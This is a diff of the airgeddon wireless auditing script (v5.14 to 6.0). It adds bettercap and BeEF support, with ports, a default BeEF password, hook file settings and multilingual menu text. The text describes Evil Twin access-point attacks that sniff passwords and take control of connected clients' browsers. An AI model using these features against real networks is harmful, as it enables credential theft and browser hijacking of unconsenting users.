@@ -1,6 +1,6 @@
 #!/bin/bash
 
-airgeddon_version="5.14"
+airgeddon_version="6.0"
 
 #Enabled 1 / Disabled 0 - Debug mode for faster development skipping intro and initial checks - Default value 0
 debug_mode=0
@@ -55,14 +55,9 @@ optional_tools_names=(
 						"bully"
 						"pixiewps"
 						"unbuffer"
+						"bettercap"
+						"beef"
 					)
-
-declare -A optional_tools=()
-
-#Initialize optional_tools values
-for item in "${optional_tools_names[@]}"; do
-	optional_tools[${item}]=0
-done
 
 update_tools=("curl")
 
@@ -93,14 +88,21 @@ declare -A possible_package_names=(
 									[${optional_tools_names[15]}]="bully" #bully
 									[${optional_tools_names[16]}]="pixiewps" #pixiewps
 									[${optional_tools_names[17]}]="expect / expect-dev" #unbuffer
+									[${optional_tools_names[18]}]="bettercap" #bettercap
+									[${optional_tools_names[19]}]="beef-xss / beef-project" #beef
 									[${update_tools[0]}]="curl" #curl
+								)
+
+#More than one alias can be defined separated by spaces at value
+declare -A possible_alias_names=(
+									["beef"]="beef-xss beef-server"
 								)
 
 #General vars
 standardhandshake_filename="handshake-01.cap"
 tmpdir="/tmp/"
 osversionfile_dir="/etc/"
-minimum_bash_version_required="4.0"
+minimum_bash_version_required="4.2"
 hashcat3_version="3.0"
 resume_message=224
 abort_question=12
@@ -151,8 +153,19 @@ dhcpd_file="ag.dhcpd.conf"
 internet_dns1="8.8.8.8"
 internet_dns2="8.8.4.4"
 sslstrip_port="10000"
+bettercap_proxy_port="8080"
+bettercap_dns_port="5300"
+minimum_bettercap_advanced_options="1.5.9"
 sslstrip_file="ag.sslstrip.log"
 ettercap_file="ag.ettercap.log"
+bettercap_file="ag.bettercap.log"
+beef_port="3000"
+beef_control_panel_url="http://127.0.0.1:${beef_port}/ui/panel"
+jshookfile="hook.js"
+beef_file="ag.beef.conf"
+beef_pass="airgeddon"
+beef_db="beef.db"
+beef_installation_url="https://github.com/beefproject/beef/wiki/Installation"
 hostapd_file="ag.hostapd.conf"
 control_file="ag.control.sh"
 webserver_file="ag.lighttpd.conf"
@@ -170,6 +183,13 @@ possible_dhcp_leases_files=(
 							"/var/state/dhcp/dhcpd.leases"
 							"/var/lib/dhcpd/dhcpd.leases"
 						)
+possible_beef_known_locations=(
+								"/usr/share/beef/"
+								"/usr/share/beef-xss/"
+								"/opt/beef/"
+								"/opt/beef-project/"
+								#Custom BeEF location (set=0)
+							)
 
 #Distros vars
 known_compatible_distros=(
@@ -204,8 +224,9 @@ declare handshake_attack_hints=(142)
 declare decrypt_hints=(171 178 179 208 244)
 declare select_interface_hints=(246)
 declare language_hints=(250)
-declare evil_twin_hints=(254 258 264 269 309 328)
+declare evil_twin_hints=(254 258 264 269 309 328 400)
 declare evil_twin_dos_hints=(267 268)
+declare beef_hints=(408)
 declare wps_hints=(342 343 344 356 369 390)
 
 #Charset vars
@@ -217,6 +238,7 @@ hashcat_charsets=("?l" "?u" "?d" "?s")
 
 #Colors vars
 green_color="\033[1;32m"
+green_color_title="\033[0;32m"
 red_color="\033[1;31m"
 red_color_slim="\033[0;031m"
 blue_color="\033[1;34m"
@@ -270,14 +292,14 @@ function language_strings() {
 	under_construction["GREEK"]="υπό κατασκευή"
 	under_constructionvar="${under_construction[${language}]}"
 
-	declare -gA possible_package_names
-	possible_package_names["ENGLISH"]="Possible package name"
-	possible_package_names["SPANISH"]="Posible nombre del paquete"
-	possible_package_names["FRENCH"]="Possible nom du paquet"
-	possible_package_names["CATALAN"]="Possible nom del paquet"
-	possible_package_names["PORTUGUESE"]="Possível nome do pacote"
-	possible_package_names["RUSSIAN"]="Возможное имя пакета"
-	possible_package_names["GREEK"]="Πιθανό όνομα πακέτου"
+	declare -gA possible_package_names_text
+	possible_package_names_text["ENGLISH"]="Possible package name"
+	possible_package_names_text["SPANISH"]="Posible nombre del paquete"
+	possible_package_names_text["FRENCH"]="Possible nom du paquet"
+	possible_package_names_text["CATALAN"]="Possible nom del paquet"
+	possible_package_names_text["PORTUGUESE"]="Possível nome do pacote"
+	possible_package_names_text["RUSSIAN"]="Возможное имя пакета"
+	possible_package_names_text["GREEK"]="Πιθανό όνομα πακέτου"
 
 	declare -gA et_misc_texts
 	et_misc_texts["ENGLISH",0]="Evil Twin AP Info"
@@ -342,15 +364,15 @@ function language_strings() {
 	et_misc_texts["CATALAN",7]="Encara no hi han clients connectats"
 	et_misc_texts["PORTUGUESE",7]="Ainda não há clientes conectados"
 	et_misc_texts["RUSSIAN",7]="Клиенты ещё не подключены"
-	et_misc_texts["GREEK",7]="Ακόμα, κανένας συνδεδεμένος χρήστης"
+	et_misc_texts["GREEK",7]="Ακόμα κανένας συνδεδεμένος χρήστης"
 
-	et_misc_texts["ENGLISH",8]="Airgeddon. Evil Twin attack captured passwords"
-	et_misc_texts["SPANISH",8]="Airgeddon. Contraseñas capturadas en ataque Evil Twin"
-	et_misc_texts["FRENCH",8]="Airgeddon. Mots de passe capturés par attaque Evil Twin"
-	et_misc_texts["CATALAN",8]="Airgeddon. Contrasenyes capturades amb atac Evil Twin"
-	et_misc_texts["PORTUGUESE",8]="Airgeddon. Senhas capturado no ataque ataque Evil Twin"
-	et_misc_texts["RUSSIAN",8]="Airgeddon. Атака Злой Двойник захватила пароли"
-	et_misc_texts["GREEK",8]="Airgeddon. Η επίθεση Evil Twin κατέγραψε κωδικούς πρόσβασης"
+	et_misc_texts["ENGLISH",8]="airgeddon. Evil Twin attack captured passwords"
+	et_misc_texts["SPANISH",8]="airgeddon. Contraseñas capturadas en ataque Evil Twin"
+	et_misc_texts["FRENCH",8]="airgeddon. Mots de passe capturés par attaque Evil Twin"
+	et_misc_texts["CATALAN",8]="airgeddon. Contrasenyes capturades amb atac Evil Twin"
+	et_misc_texts["PORTUGUESE",8]="airgeddon. Senhas capturado no ataque ataque Evil Twin"
+	et_misc_texts["RUSSIAN",8]="airgeddon. Атака Злой Двойник захватила пароли"
+	et_misc_texts["GREEK",8]="airgeddon. Η επίθεση Evil Twin κατέγραψε κωδικούς πρόσβασης"
 
 	et_misc_texts["ENGLISH",9]="Wireless network, ESSID:"
 	et_misc_texts["SPANISH",9]="Red inalámbrica, ESSID:"
@@ -432,13 +454,13 @@ function language_strings() {
 	et_misc_texts["RUSSIAN",18]="Пароль верен, подключение устанавливается"
 	et_misc_texts["GREEK",18]="Ο κωδικός πρόσβασης είναι σωστός, η σύνδεση θα αποκατασταθεί σε λίγα λεπτά"
 
-	et_misc_texts["ENGLISH",19]="Airgeddon. Captive portal Evil Twin attack captured password"
-	et_misc_texts["SPANISH",19]="Airgeddon. Contraseña capturada en el portal cautivo del ataque Evil Twin"
-	et_misc_texts["FRENCH",19]="Airgeddon. Mot de passe capturé par le portail captif de l'attaque Evil Twin"
-	et_misc_texts["CATALAN",19]="Airgeddon. Contrasenya capturada al portal captiu de l'atac Evil Twin"
-	et_misc_texts["PORTUGUESE",19]="Airgeddon. Senha capturada no ataque Evil Twin portal cativo"
-	et_misc_texts["RUSSIAN",19]="Airgeddon. Атака Злой Двойник + Перехватывающий портал захватили пароль"
-	et_misc_texts["GREEK",19]="Airgeddon. Η επίθεση Evil Twin με captive portal κατέγραψε τον κωδικό πρόσβασης"
+	et_misc_texts["ENGLISH",19]="airgeddon. Captive portal Evil Twin attack captured password"
+	et_misc_texts["SPANISH",19]="airgeddon. Contraseña capturada en el portal cautivo del ataque Evil Twin"
+	et_misc_texts["FRENCH",19]="airgeddon. Mot de passe capturé par le portail captif de l'attaque Evil Twin"
+	et_misc_texts["CATALAN",19]="airgeddon. Contrasenya capturada al portal captiu de l'atac Evil Twin"
+	et_misc_texts["PORTUGUESE",19]="airgeddon. Senha capturada no ataque Evil Twin portal cativo"
+	et_misc_texts["RUSSIAN",19]="airgeddon. Атака Злой Двойник + Перехватывающий портал захватили пароль"
+	et_misc_texts["GREEK",19]="airgeddon. Η επίθεση Evil Twin με captive portal κατέγραψε τον κωδικό πρόσβασης"
 
 	et_misc_texts["ENGLISH",20]="Attempts"
 	et_misc_texts["SPANISH",20]="Intentos"
@@ -495,6 +517,14 @@ function language_strings() {
 	et_misc_texts["PORTUGUESE",26]="Erro. A senha deve ter no mínimo 8 caracteres. Redirecionando para a pagina principal"
 	et_misc_texts["RUSSIAN",26]="Ошибка. В пароле должно быть не менее 8 символов. Перенаправление на главную страницу"
 	et_misc_texts["GREEK",26]="Σφάλμα. Ο κωδικός πρόσβασης πρέπει να αποτελείται από τουλάχιστον 8 χαρακτήρες. Θα καθοδηγηθείτε στην κύρια οθόνη"
+
+	et_misc_texts["ENGLISH",27]="This attack has two parts. Watch the sniffer's screen to see if a password appears. You can also open BeEF control panel at ${white_color}${beef_control_panel_url}${pink_color} , log in (user: ${white_color}beef${pink_color} / pass: ${white_color}${beef_pass}${pink_color}) and try to control the clients browser"
+	et_misc_texts["SPANISH",27]="Este ataque tiene dos partes. Estate atento a la pantalla del sniffer para ver si aparece alguna contraseña. También puedes abrir el panel de control de BeEF en ${white_color}${beef_control_panel_url}${pink_color} , hacer login (user: ${white_color}beef${pink_color} / pass: ${white_color}${beef_pass}${pink_color}) e intentar controlar el navegador de los clientes"
+	et_misc_texts["FRENCH",27]="Cette attaque comporte deux parties. Vérifiez pendant l'attaque dans la console du sniffeur si un mot de passe a été capturé. Vous pouvez également ouvrir le BeEF du panneau de commande dans ${white_color}${beef_control_panel_url}${pink_color} , pour vous connecter (user: ${white_color}beef${pink_color} / pass: ${white_color}${beef_pass}${pink_color}) et essayer de contrôler le navigateur client"
+	et_misc_texts["CATALAN",27]="Aquest atac té dues parts. Amb aquest atac, estigues atent a la pantalla de l'sniffer per veure si apareix alguna contrasenya. També pots obrir el panell de control de BeEF en ${white_color}${beef_control_panel_url}${pink_color} , fer login (user: ${white_color}beef${pink_color} / pass: ${white_color}${beef_pass}${pink_color}) i intentar controlar el navegador dels clients"
+	et_misc_texts["PORTUGUESE",27]="Este ataque tem duas partes. Com este ataque, fique atento na tela do sniffer para ver se aparece alguma senha. Você também pode abrir o painel de controle do BeEF em ${white_color}${beef_control_panel_url}${pink_color} , para login (user: ${white_color}beef${pink_color} / senha: ${white_color}${beef_pass}${pink_color}) e tentar controlar o navegador dos clientes"
+	et_misc_texts["RUSSIAN",27]="Эта атака идёт по двум направлениям. Вы можете наблюдать за окном сниффера, чтобы отследить появление пароля. Также можете перейти в панель управления BeEF ${white_color}${beef_control_panel_url}${pink_color} , учётные данные для входа (user: ${white_color}beef${pink_color} / pass: ${white_color}${beef_pass}${pink_color}) и попытаться управлять браузером клиентов"
+	et_misc_texts["GREEK",27]="Αυτή η επίθεση έχει δύο μέρη. Παρακολουθήστε την οθόνη του sniffer για να δείτε εαν εμφανιστεί κάποιος κωδικός. Μπορείτε επίσης να ανοίξετε τον πίνακα ελέγχου του BeEF στο ${white_color}${beef_control_panel_url}${pink_color} , συνδεθείτε (user: ${white_color}beef${pink_color} / pass: ${white_color}${beef_pass}${pink_color}) και προσπαθείστε να ελέγξετε τον browser του χρήστη-πελάτη"
 
 	declare -A arr
 	arr["ENGLISH",0]="This interface ${interface} is already in managed mode"
@@ -1087,7 +1117,7 @@ function language_strings() {
 	arr["CATALAN",73]="airgeddon script v${airgeddon_version} desenvolupat per :"
 	arr["PORTUGUESE",73]="Script airgeddon v${airgeddon_version} desenvolvido por :"
 	arr["RUSSIAN",73]="скрипт airgeddon v${airgeddon_version} создал :"
-	arr["GREEK",73]="airgeddon script v${airgeddon_version} προγραμματίστηκε από :"
+	arr["GREEK",73]="Το airgeddon script v${airgeddon_version} προγραμματίστηκε από :"
 
 	arr["ENGLISH",74]="This script is under GPLv3 (or later) License"
 	arr["SPANISH",74]="Este script está bajo Licencia GPLv3 (o posterior)"
@@ -1305,13 +1335,13 @@ function language_strings() {
 	arr["RUSSIAN",100]="Параметры Michael Shutdown"
 	arr["GREEK",100]="Παράμετροι Michael Shutdown"
 
-	arr["ENGLISH",101]="Airgeddon main menu"
+	arr["ENGLISH",101]="airgeddon main menu"
 	arr["SPANISH",101]="Menú principal airgeddon"
 	arr["FRENCH",101]="Menu principal d'airgeddon"
 	arr["CATALAN",101]="Menú principal airgeddon"
 	arr["PORTUGUESE",101]="Menu principal airgeddon"
-	arr["RUSSIAN",101]="Главное меню Airgeddon"
-	arr["GREEK",101]="Αρχικό μενού Airgeddon"
+	arr["RUSSIAN",101]="Главное меню airgeddon"
+	arr["GREEK",101]="Αρχικό μενού airgeddon"
 
 	arr["ENGLISH",102]="DoS attacks menu"
 	arr["SPANISH",102]="Menú ataques DoS"
@@ -2025,13 +2055,13 @@ function language_strings() {
 	arr["RUSSIAN",190]="Начало расшифровки. После запуска, нажмите [Ctrl+C] для остановки..."
 	arr["GREEK",190]="Γίνεται έναρξη αποκρυπτογράφησης. Όταν ξεκινήσει, πατήστε [Ctrl+C] για να σταματήσει..."
 
-	arr["ENGLISH",191]="Capture file you selected is an unsupported file format (not a pcap or IVs file)"
-	arr["SPANISH",191]="El fichero de captura que has seleccionado tiene un formato no soportado (no es un fichero pcap o de IVs)"
-	arr["FRENCH",191]="Le fichier de capture que vous avez sélectionné est dans un format non supporté (ce n'est pas un fichier pcap ou IVs)"
-	arr["CATALAN",191]="El fitxer de captura que has seleccionat té un format no suportat (no és un fitxer pcap o de IVs)"
-	arr["PORTUGUESE",191]="O arquivo de captura selecionado tem um invalido (não é um arquivo pcap ou IVs)"
-	arr["RUSSIAN",191]="Файл захвата, который вы выбрали, в неподдерживаемом формате (это не файл pcap или IVs)"
-	arr["GREEK",191]="Η επέκταση του αρχείου καταγραφής που έχετε επιλέξει δεν υποστηρίζεται (δεν είναι pcap ούτε IVs αρχείο)"
+	arr["ENGLISH",191]="${blue_color}airgeddon can't find the directory path where you have BeEF installed. ${green_color}Do you want to enter it manually? ${normal_color}[y/n]"
+	arr["SPANISH",191]="${blue_color}airgeddon no ha podido encontrar la ruta del directorio donde tienes instalado BeEF. ${green_color}¿Quieres introducirla manualmente? ${normal_color}[y/n]"
+	arr["FRENCH",191]="${pending_of_translation} ${blue_color}airgeddon n'a pas pu trouver le chemin vers le répertoire où vous avez installé BeEF. ${green_color}Voulez-vous entrer manuellement? ${normal_color}[y/n]"
+	arr["CATALAN",191]="${blue_color}airgeddon no ha pogut trobar la ruta del directori on tens instal·lat BeEF. ${green_color}¿Vols introduir-la manualment? ${normal_color}[y/n]"
+	arr["PORTUGUESE",191]="${blue_color}O airgeddon não conseguiu encontrar o diretório onde você instalou o BeEF. ${green_color}Você quer inseri-lo manualmente? ${normal_color}[y/n]"
+	arr["RUSSIAN",191]="${blue_color}airgeddon не может найти путь к каталогу, где вы установили BeEF. ${green_color}Вы хотите ввести его вручную? ${normal_color}[y/n]"
+	arr["GREEK",191]="${blue_color}Το airgeddon δεν μπορεί να βρει το μονοπάτι για τον κατάλογο όπου έχετε εγκαταστημένο το BeEF. ${green_color}Θέλετε να το εισάγετε χειροκίνητα; ${normal_color}[y/n]"
 
 	arr["ENGLISH",192]="You already have selected a BSSID during this session and is present in capture file [${normal_color}${bssid}${blue_color}]"
 	arr["SPANISH",192]="Ya tienes seleccionado un BSSID en esta sesión y está presente en el fichero de captura [${normal_color}${bssid}${blue_color}]"
@@ -2577,13 +2607,13 @@ function language_strings() {
 	arr["RUSSIAN",259]="6.  Атака Злой Двойник ТД со сниффингом"
 	arr["GREEK",259]="6.  Επίθεση Evil Twin AP με sniffing"
 
-	arr["ENGLISH",260]="9.  Return to main menu"
-	arr["SPANISH",260]="9.  Volver al menú principal"
-	arr["FRENCH",260]="9.  Retourner au menu principal"
-	arr["CATALAN",260]="9.  Tornar al menú principal"
-	arr["PORTUGUESE",260]="9.  Voltar ao menu principal"
-	arr["RUSSIAN",260]="9.  Возврат в главное меню"
-	arr["GREEK",260]="9.  Επιστροφή στο αρχικό μενού"
+	arr["ENGLISH",260]="10. Return to main menu"
+	arr["SPANISH",260]="10. Volver al menú principal"
+	arr["FRENCH",260]="10. Retourner au menu principal"
+	arr["CATALAN",260]="10. Tornar al menú principal"
+	arr["PORTUGUESE",260]="10. Voltar ao menu principal"
+	arr["RUSSIAN",260]="10. Возврат в главное меню"
+	arr["GREEK",260]="10. Επιστροφή στο αρχικό μενού"
 
 	arr["ENGLISH",261]="7.  Evil Twin AP attack with sniffing and sslstrip"
 	arr["SPANISH",261]="7.  Ataque Evil Twin AP con sniffing y sslstrip"
@@ -2601,13 +2631,13 @@ function language_strings() {
 	arr["RUSSIAN",262]="без сниффинга, перехватывающий портал"
 	arr["GREEK",262]="χωρίς sniffing, captive portal"
 
-	arr["ENGLISH",263]="8.  Evil Twin AP attack with captive portal (monitor mode needed)"
-	arr["SPANISH",263]="8.  Ataque Evil Twin AP con portal cautivo (modo monitor requerido)"
-	arr["FRENCH",263]="8.  Attaque Evil Twin avec portail captif (mode moniteur nécessaire)"
-	arr["CATALAN",263]="8.  Atac Evil Twin AP amb portal captiu (es requereix mode monitor)"
-	arr["PORTUGUESE",263]="8.  Ataque Evil Twin AP com portal cativo (modo monitor obrigatório)"
-	arr["RUSSIAN",263]="8.  Атака Злой Двойник ТД с перехватывающим порталом (необходим режим монитора)"
-	arr["GREEK",263]="8.  Επίθεση Evil Twin AP με captive portal (χρειάζεται η κατάσταση παρακολούθησης)"
+	arr["ENGLISH",263]="9.  Evil Twin AP attack with captive portal (monitor mode needed)"
+	arr["SPANISH",263]="9.  Ataque Evil Twin AP con portal cautivo (modo monitor requerido)"
+	arr["FRENCH",263]="9.  Attaque Evil Twin avec portail captif (mode moniteur nécessaire)"
+	arr["CATALAN",263]="9.  Atac Evil Twin AP amb portal captiu (es requereix mode monitor)"
+	arr["PORTUGUESE",263]="9.  Ataque Evil Twin AP com portal cativo (modo monitor obrigatório)"
+	arr["RUSSIAN",263]="9.  Атака Злой Двойник ТД с перехватывающим порталом (необходим режим монитора)"
+	arr["GREEK",263]="9.  Επίθεση Evil Twin AP με captive portal (χρειάζεται η κατάσταση παρακολούθησης)"
 
 	arr["ENGLISH",264]="The captive portal attack tries to one of the network clients provide us the password for the wifi network by entering it on our portal"
 	arr["SPANISH",264]="El ataque del portal cautivo intentará conseguir que uno de los clientes de la red nos proporcione la contraseña de la red wifi introduciéndola en nuestro portal"
@@ -2951,7 +2981,7 @@ function language_strings() {
 	arr["CATALAN",306]="El sniffer ha capturat contrasenyes. Fitxer desat a ${normal_color}[${ettercap_logpath}]"
 	arr["PORTUGUESE",306]="O sniffer capturou senhas. I arquivo salvo no ${normal_color}[${ettercap_logpath}]"
 	arr["RUSSIAN",306]="Сниффер захватил пароли. Файл сохранён в ${normal_color}[${ettercap_logpath}]"
-	arr["GREEK",306]="Καταγράφτηκαν κωδικοί πρόσβασης από τον sniffer. Το αρχείο αποθηκεύτηκε στο ${normal_color}[${ettercap_logpath}]"
+	arr["GREEK",306]="Καταγράφηκαν κωδικοί πρόσβασης από τον sniffer. Το αρχείο αποθηκεύτηκε στο ${normal_color}[${ettercap_logpath}]"
 
 	arr["ENGLISH",307]="Language changed to Russian"
 	arr["SPANISH",307]="Idioma cambiado a Ruso"
@@ -3665,6 +3695,174 @@ function language_strings() {
 	arr["RUSSIAN",395]="Пропуск заставки, требуется окно большего размера"
 	arr["GREEK",395]="Το intro παρακάμπτεται, χρειάζεται μεγαλύτερο μέγεθος παραθύρου"
 
+	arr["ENGLISH",396]="8.  Evil Twin AP attack with sniffing and bettercap-sslstrip2/BeEF"
+	arr["SPANISH",396]="8.  Ataque Evil Twin AP con sniffing y bettercap-sslstrip2/BeEF"
+	arr["FRENCH",396]="8.  Attaque Evil Twin avec capture des données et bettercap-sslstrip2/BeEF"
+	arr["CATALAN",396]="8.  Atac Evil Twin AP amb sniffing i bettercap-sslstrip2/BeEF"
+	arr["PORTUGUESE",396]="8.  Ataque Evil Twin AP com sniffing e bettercap-sslstrip2/BeEF"
+	arr["RUSSIAN",396]="8.  Атака Злой Двойник ТД со сниффингом и bettercap-sslstrip2/BeEF"
+	arr["GREEK",396]="8.  Επίθεση Evil Twin AP με sniffing και bettercap-sslstrip2/BeEF"
+
+	arr["ENGLISH",397]="Evil Twin AP attack with sniffing and bettercap-sslstrip2/BeEF"
+	arr["SPANISH",397]="Ataque Evil Twin AP con sniffing y bettercap-sslstrip2/BeEF"
+	arr["FRENCH",397]="Attaque Evil Twin avec capture de données et bettercap-sslstrip2/BeEF"
+	arr["CATALAN",397]="Atac Evil Twin AP amb sniffing i bettercap-sslstrip2/BeEF"
+	arr["PORTUGUESE",397]="Ataque Evil Twin AP com sniffing e bettercap-sslstrip2/BeEF"
+	arr["RUSSIAN",397]="Атака Злой Двойник ТД со сниффингом и bettercap-sslstrip2/BeEF"
+	arr["GREEK",397]="Επίθεση Evil Twin AP με sniffing και bettercap-sslstrip2/BeEF"
+
+	arr["ENGLISH",398]="Type the path to store the file or press [Enter] to accept the default proposal ${normal_color}[${default_bettercap_logpath}]"
+	arr["SPANISH",398]="Escribe la ruta donde guardaremos el fichero o pulsa [Enter] para aceptar la propuesta por defecto ${normal_color}[${default_bettercap_logpath}]"
+	arr["FRENCH",398]="Entrez le chemin du fichier ou bien appuyez sur [Entrée] pour utiliser le chemin proposé ${normal_color}[${default_bettercap_logpath}]"
+	arr["CATALAN",398]="Escriu la ruta on desarem el fitxer o prem [Enter] per acceptar la proposta per defecte ${normal_color}[${default_bettercap_logpath}]"
+	arr["PORTUGUESE",398]="Digite o caminho onde armazenar o arquivo ou pressione [Enter] para aceitar o padrão ${normal_color}[${default_bettercap_logpath}]"
+	arr["RUSSIAN",398]="Напечатайте путь до файла для сохранения или нажмите [Enter] для принятия предложения по умолчанию ${normal_color}[${default_bettercap_logpath}]"
+	arr["GREEK",398]="Πληκτρολογήστε το μονοπάτι για να αποθηκεύσετε το αρχείο ή πατήστε [Enter] για την προεπιλεγμένη επιλογή ${normal_color}[${default_bettercap_logpath}]"
+
+	arr["ENGLISH",399]="Passwords captured by sniffer. File saved at ${normal_color}[${bettercap_logpath}]"
+	arr["SPANISH",399]="El sniffer ha capturado contraseñas. Fichero salvado en ${normal_color}[${bettercap_logpath}]"
+	arr["FRENCH",399]="Des mots de passe ont été capturé et ont été enregistré dans ${normal_color}[${bettercap_logpath}]"
+	arr["CATALAN",399]="El sniffer ha capturat contrasenyes. Fitxer desat a ${normal_color}[${bettercap_logpath}]"
+	arr["PORTUGUESE",399]="O sniffer capturou senhas. I arquivo salvo no ${normal_color}[${bettercap_logpath}]"
+	arr["RUSSIAN",399]="Сниффер захватил пароли. Файл сохранён в ${normal_color}[${bettercap_logpath}]"
+	arr["GREEK",399]="Καταγράφηκαν κωδικοί πρόσβασης από τον sniffer. Το αρχείο αποθηκεύτηκε στο ${normal_color}[${bettercap_logpath}]"
+
+	arr["ENGLISH",400]="On Evil Twin attack with BeEF integrated, in addition to obtaining keys using sniffing techniques, you can try to control the client's browser launching numerous attack vectors. The success of these will depend on many factors such as the kind of client's browser and its version"
+	arr["SPANISH",400]="En el ataque Evil Twin con BeEF integrado, además de obtener claves con sniffing, podrás intentar controlar el navegador de los clientes lanzando numerosos vectores de ataque. El éxito de estos dependerá de muchos factores como el tipo de navegador y la versión que utilice el cliente"
+	arr["FRENCH",400]="Avec l'attaque Evil Twin plus BeEF il est possible obtenir les clés en sniffant, mais pas seulement. Vous pouvez essayer de prendre le contrôle du navigateur web de la vicitme. Le succès des attaques proposées dépendra, entre autre, de la version du navigateur installé"
+	arr["CATALAN",400]="En l'atac Evil Twin amb Beef integrat, a més d'obtenir claus amb sniffing, podràs intentar controlar el navegador dels clients llançant nombrosos vectors d'atac. L'èxit d'aquests dependrà de molts factors com el tipus de navegador i la versió que utilitzi el client"
+	arr["PORTUGUESE",400]="No ataque Evil Twin com BeEF integrado, além de obter chaves com sniffing, você pode tentar controlar o navegador do cliente lançando inúmeros vetores de ataque. O sucesso destes dependerá de muitos fatores, como tipo de navegador e versão utilizada pelo cliente"
+	arr["RUSSIAN",400]="С атакой Злой Двойник в дополнении к получению паролей, применяя техники сниффинга, вы можете попробовать контролировать клиентский браузер, запуская атаки по ряду векторов. Их успех зависит от многих факторов, в том числе от типа и версии клиентского браузера"
+	arr["GREEK",400]="Στην επίθεση Evil Twin με ενσωματωμένο BeEF, εκτός από την απόκτηση κλειδιών με τη χρήση τεχνικών sniffing, μπορείτε να προσπαθήσετε να ελέγξετε τον browser του χρήστη-πελάτη κάνοντας χρήση κάποιων attack vectors. Η επιτυχία αυτών θα εξαρτηθεί από πολλούς παράγοντες όπως το είδος του browser του χρήστη-πελάτη και την έκδοσή του"
+
+	arr["ENGLISH",401]="The beef package you have installed is not BeEF (Browser Exploitation Framework). You have Beef (Flexible Brainfuck interpreter) installed. Both executables have the same name and can lead to confusion. Uninstall it and install what airgeddon needs if you want to use that feature. Installation guide: ${beef_installation_url}"
+	arr["SPANISH",401]="El paquete beef que tienes instalado no es BeEF (Browser Exploitation Framework). Tienes instalado Beef (Flexible Brainfuck interpreter). Ambos ejecutables se llaman igual y puede dar lugar a confusión. Desinstálalo e instala el que airgeddon necesita si quieres usar esa característica. Guía de instalación: ${beef_installation_url}"
+	arr["FRENCH",401]="Le paquet beef installé n'est pas le bon: Vous avez installé Beef (Flexible Brainfuck interpreter) et vous devez installer BeEF (Browser Exploitation Framework). Les deux ont le même nom et peut induire en erreur. Désinstallez et installez la version dont airgeddon a besoin si vous souhaitez utiliser cette fonctionnalité. Guide d'installation: ${beef_installation_url}"
+	arr["CATALAN",401]="El paquet beef que tens instal·lat no és BeEF (Browser Exploitation Framework). Tens instal·lat Beef (Flexible Brainfuck interpreter). Tots dos executables es diuen igual i pot donar lloc a confusió. Desinstalalo i instal·la el que airgeddon necessita si vols utilitzar aquesta característica. Guia d'instal·lació: ${beef_installation_url}"
+	arr["PORTUGUESE",401]="O pacote beef instalado instalado não é o BeEF (Browser Exploitation Framework). Você instalou Beef (Flexible Brainfuck interpreter). Ambos possuem o mesmo nome e executável o que pode levar a confusão. Desinstale-o e instale o que o airgeddon precisa se você quiser usar esse recurso. Guia de Instalação: ${beef_installation_url}"
+	arr["RUSSIAN",401]="Установленный вами пакет beef не является пакетом BeEF (Browser Exploitation Framework). Вы установили Beef (Flexible Brainfuck interpreter). Оба исполнимых файла имеют одинаковое имя и могут вызвать путаницу. Если вы хотите использовать эту функцию, удалите его и установите тот, который требует airgeddon. Инструкция по установке: ${beef_installation_url}"
+	arr["GREEK",401]="Το πακέτο beef που έχετε εγκαταστημένο δεν είναι το BeEF (Browser Exploitation Framework). Έχετε εγκατεστημένο το Beef (Flexible Brainfuck interpreter). Και τα δύο εκτελέσιμα αρχεία έχουν το ίδιο όνομα και μπορεί να γίνει κάποιο μπέρδεμα. Απεγκαταστήστε το και εγκαταστήστε αυτό που χρειάζεται το airgeddon, αν θέλετε να χρησιμοποιήσετε αυτή την επιλογή. Οδηγός εγκατάστασης: ${beef_installation_url}"
+
+	arr["ENGLISH",402]="Enter the absolute path of the directory where BeEF is installed :"
+	arr["SPANISH",402]="Introduce la ruta absoluta del directorio donde está instalado BeEF :"
+	arr["FRENCH",402]="Entrez la route absolue vers le dossier où BeEF est installé :"
+	arr["CATALAN",402]="Introdueix la ruta absoluta del directori on està instal·lat BeEF :"
+	arr["PORTUGUESE",402]="Digite o caminho absoluto do diretório onde BeEF está instalado :"
+	arr["RUSSIAN",402]="Введите абсолютный путь к каталогу, в котором установлен BeEF :"
+	arr["GREEK",402]="Εισάγετε το απόλυτο μονοπάτι για τον κατάλογο στον όποιο βρίσκεται εγκατεστημένο το BeEF :"
+
+	arr["ENGLISH",403]="The directory you entered doesn't exist"
+	arr["SPANISH",403]="El directorio introducido no existe"
+	arr["FRENCH",403]="Le dossier indiqué n'existe pas"
+	arr["CATALAN",403]="El directori introduït no existeix"
+	arr["PORTUGUESE",403]="O diretório digitado não existe"
+	arr["RUSSIAN",403]="Каталог, который вы ввели, не существует"
+	arr["GREEK",403]="Ο κατάλογος που έχετε εισάγει δεν υπάρχει"
+
+	arr["ENGLISH",404]="The entered path isn't absolute. An absolute path must always begin with \"/\""
+	arr["SPANISH",404]="La ruta introducida no es absoluta. Una ruta absoluta siempre debe comenzar por \"/\""
+	arr["FRENCH",404]="La route saisie n'est pas absolue. Une route absolue doit toujours commencer par \"/\""
+	arr["CATALAN",404]="La ruta introduïda no és absoluta. Una ruta absoluta sempre ha de començar per \"/\""
+	arr["PORTUGUESE",404]="O caminho digitado não é absoluta. Um caminho absoluto deve sempre começar com \"/\""
+	arr["RUSSIAN",404]="Введенный путь не является абсолютным. Абсолютный путь всегда должен начинаться с \"/\""
+	arr["GREEK",404]="Το μονοπάτι που έχετε εισάγει δεν είναι απόλυτο. Ένα απόλυτο μονοπάτι πρέπει πάντα να ξεκινάει με \"/\""
+
+	arr["ENGLISH",405]="Checking BeEF..."
+	arr["SPANISH",405]="Comprobando BeEF..."
+	arr["FRENCH",405]="Vérification de BeEF..."
+	arr["CATALAN",405]="Comprovant BeEF..."
+	arr["PORTUGUESE",405]="Verificando BeEF..."
+	arr["RUSSIAN",405]="Проверка BeEF..."
+	arr["GREEK",405]="Γίνεται έλεγχος του BeEF..."
+
+	arr["ENGLISH",406]="No BeEF executable was detected in given directory"
+	arr["SPANISH",406]="No se ha detectado un ejecutable de BeEF en el directorio indicado"
+	arr["FRENCH",406]="BeEF n'est pas présent dans le dossierque vous avez indiqué"
+	arr["CATALAN",406]="No s'ha detectat un executable de BeEF al directori indicat"
+	arr["PORTUGUESE",406]="O executável do BeEF não foi detectado no diretório especificado"
+	arr["RUSSIAN",406]="Ни один исполняемый файл BeEF не был обнаружен в заданной директории"
+	arr["GREEK",406]="Δεν εντοπίστηκε κάποιο εκτελέσιμο αρχείο BeEF στον κατάλογο που έχετε εισάγει"
+
